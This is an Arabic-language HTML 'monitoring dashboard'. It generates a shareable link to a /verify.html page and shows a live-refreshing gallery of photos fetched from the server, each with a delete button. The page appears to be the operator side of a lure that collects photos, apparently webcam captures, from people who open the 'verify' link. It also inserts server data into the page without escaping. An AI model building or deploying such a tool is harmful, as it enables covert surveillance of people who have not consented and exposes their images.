<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Dashboard | لوحة المراقبة</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f4f7f6; padding: 20px; }
        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); margin-bottom: 20px; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
        .img-item { border: 1px solid #ddd; padding: 5px; border-radius: 8px; text-align: center; background: #fff; }
        img { width: 100%; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>لوحة المراقبة المركزية</h2>
        <p>رابط المراقبة للمشاركة:</p>
        <input type="text" id="shareLink" readonly style="width: 60%; padding: 8px;">
        <button onclick="copyLink()">نسخ الرابط</button>
    </div>
    <div class="gallery" id="gallery"></div>

    <script>
        document.getElementById('shareLink').value = window.location.origin + '/verify.html';
        function copyLink() {
            const input = document.getElementById('shareLink');
            input.select(); document.execCommand('copy'); alert('تم النسخ');
        }
        async function update() {
            const res = await fetch('/photos');
            const data = await res.json();
            document.getElementById('gallery').innerHTML = data.map(p => `
                <div class="img-item">
                    <img src="${p.data}">
                    <button onclick="fetch('/delete/${p.id}', {method:'DELETE'}).then(()=>update())">حذف</button>
                </div>
            `).join('');
        }
        setInterval(update, 2000); update();
    </script>
</body>
</html>
